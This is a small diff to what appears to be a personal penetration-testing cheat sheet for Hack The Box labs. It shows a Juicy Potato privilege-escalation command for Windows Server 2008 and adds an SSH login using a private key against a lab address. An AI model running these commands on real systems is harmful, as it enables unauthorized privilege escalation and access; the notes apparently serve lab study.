@@ -303,3 +303,6 @@ attrib
 
 Windows 2008 server juicy potato command:
 jp.exe -t * -p shell.bat -l 4444 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} #Refer to rana khalil bounty htb
+
+ssh login with private key:
+ssh hype@10.10.10.79 -i private_key
